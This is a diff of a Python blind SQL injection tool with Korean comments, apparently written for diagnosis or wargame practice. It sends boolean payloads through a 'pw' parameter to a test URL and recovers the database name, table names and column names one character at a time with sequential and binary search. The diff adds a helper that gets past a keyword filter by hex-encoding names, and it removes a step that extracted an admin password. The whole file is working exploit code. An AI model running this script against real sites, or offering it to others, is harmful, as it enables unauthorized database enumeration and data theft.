@@ -4,14 +4,39 @@ import requests
 VICTIM = 'http://test.mydomain.com/prob.php'  #진단할 URL
 PARAM = "pw"  # Blind SQL injection Payload를 포함할 파라미터
 BLIND_CHECK_STR = 'Hello admin'  # Blind SQL Injection 참/거짓을 판단할 텍스트
+FILTER_STR = 'hpcnt'
 
+
+# Blind Sql Injection 결과 출력하는 함수
+def print_result(db_name, column_dict):
+    line_count = 0
+    print("{0:#^80}".format(" result "))
+    print("{0:^80}".format("DB name : " + db_name))
+    print("{0:#^80}".format(""))
+    for table, columns in column_dict.items():
+        line_count += 1
+        print("{0:^80}".format("Table name : %s" % table))
+        print("{0:^80}".format('Column List : '+' / '.join(columns)))
+        if not (line_count is len(column_dict)):
+            print("{0:-^80}".format(""))
+    print("{0:#^80}".format(""))
+
+
+# DB 명, 테이블명, 컬럼 이름 중 필터링 되고 있는 문자열이 있으면 hex값으로 변환하는 함수
+# 예제에서는 hpcnt 문자열이 필터링 되고 있으므로 hex값을 이용해 우회 가능
+def check_filtering_str(checked_str, filter_str):
+    if filter_str in checked_str:
+        convert_str = "0x" + checked_str.encode("utf8").hex()
+    else:
+        convert_str = "'" + checked_str + "'"
+    return convert_str
 
 
 # Blind SQL Injection payload가 담긴 http request 후 response를 받아오는 함수
 def get_response(payload):
     params = {PARAM: payload}
     response = requests.get(VICTIM, params=params)
-    # print(response.url)
+
     return response
 
 
@@ -58,6 +83,7 @@ def sequential_search(query, number):
             return length
     raise OverflowError
 
+
 # DB 명 구하는 함수
 def get_db_name():
     # DB 이름 길이 가져오기
@@ -78,14 +104,14 @@ def get_db_name():
 def get_tables_name(db_name):
     # DB 내 테이블 갯수 가져오기
     query = "1' or (select count(table_name) from information_schema.tables where table_schema=" \
-            + check_filtering_str(db_name) + ") > {0}#"
+            + check_filtering_str(db_name, FILTER_STR) + ") > {0}#"
     table_count = sequential_search(query, 50)
 
     # DB 내 각 테이블들의 이름 길이 가져오기
     table_names_length_list = []
     for i in range(0, table_count):
         query = "1' or (select length(table_name) from information_schema.tables where table_schema=" \
-                + check_filtering_str(db_name) + " limit " + str(i) + ", 1) > {0}#"
+                + check_filtering_str(db_name, FILTER_STR) + " limit " + str(i) + ", 1) > {0}#"
         table_names_length_list.append(sequential_search(query, 50))
 
     # DB 내 테이블 목록 가져오기
@@ -95,7 +121,7 @@ def get_tables_name(db_name):
     for i in range(0, table_count):
         print("table " + str(i + 1) + " start!")
         query = "1' or (select ascii(substring(table_name,{0},1)) from information_schema.tables where table_schema=" \
-                + check_filtering_str(db_name) + " limit " + str(i) + ", 1) {1} {2}#"
+                + check_filtering_str(db_name, FILTER_STR) + " limit " + str(i) + ", 1) {1} {2}#"
         tables_name.append(binary_search(query, table_names_length_list[i]))
 
     print("{0:=^40}".format(""))
@@ -109,14 +135,14 @@ def get_tables_name(db_name):
 def get_columns_name(table_name):
     # 테이블 내 컬럼 갯수 가져오기
     query = "1' or (select count(*) from information_schema.columns where table_name=" \
-            + check_filtering_str(table_name) + ") > {0}#"
+            + check_filtering_str(table_name, FILTER_STR) + ") > {0}#"
     column_count = sequential_search(query, 100)
 
     # 테이블 내 각 컬럼들의 이름 길이 가져오기
     column_list_length = []
     for i in range(0, column_count):
         query = "1' or (select length(column_name) from information_schema.columns where table_name=" \
-                + check_filtering_str(table_name) + " limit " + str(i) + ", 1) > {0}#"
+                + check_filtering_str(table_name, FILTER_STR) + " limit " + str(i) + ", 1) > {0}#"
         column_list_length.append(sequential_search(query, 50))
 
     # 테이블 내 컬럼 목록 가져오기
@@ -126,7 +152,7 @@ def get_columns_name(table_name):
     for i in range(0, column_count):
         print("table " + table_name + "'s column " + str(i + 1) + " start!")
         query = "1' or (select ascii(substring(column_name,{0},1)) from information_schema.columns where table_name=" \
-                + check_filtering_str(table_name) + " limit " + str(i) + ", 1) {1} {2}#"
+                + check_filtering_str(table_name, FILTER_STR) + " limit " + str(i) + ", 1) {1} {2}#"
         columns_name.append(binary_search(query, column_list_length[i]))
 
     print("{0:=^40}".format(""))
@@ -134,7 +160,6 @@ def get_columns_name(table_name):
         print("table : " + table_name + " / Column " + str(i + 1) + " : " + columns_name[i])
     print("")
     return columns_name
-
 
 
 # 메인 함수
@@ -151,11 +176,11 @@ def main():
 
         for table_name in tables_name:
             column_dict[table_name] = get_columns_name(table_name)
+            print(column_dict[table_name])
 
-        admin_pw = get_pw('pw')
         print("\n\n")
 
-        print_result(db_name, column_dict, admin_pw)
+        print_result(db_name, column_dict)
     except OverflowError:
         print("Error : DB, Column, Table 이름의 길이가 예상보다 깁니다.")
     except ArithmeticError:
@@ -163,7 +188,8 @@ def main():
     except requests.exceptions.RequestException:
         print("Error : WEB 서버에 접근할수 없습니다.")
     except Exception as ex:
-        print("Error : 알 수 없는 에러로 DB 이름을 가져오지 못했습니다.", ex)
+        print("Error : 알 수 없는 에러로 DB 이름을 가져오지 못했습니다.\n", ex.with_traceback())
+
 
 if __name__ == "__main__":
     main()
